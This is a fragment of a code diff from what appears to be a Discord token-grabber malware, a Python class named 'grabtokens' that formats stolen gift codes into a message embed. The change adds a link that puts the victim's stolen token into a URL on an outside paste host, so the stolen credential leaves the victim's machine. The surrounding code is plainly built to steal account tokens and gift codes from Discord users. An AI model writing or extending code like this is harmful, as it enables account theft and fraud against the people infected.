@@ -331,7 +331,7 @@ class grabtokens():
                 val += f'\n:gift: **None**\n'
             else:
                 for c, t in val_codes:
-                    val += f'\n:gift: `{t}:`\n**{c}**\n'
+                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n'
 
             embed.add_field(name=val_name, value=val, inline=False)
 
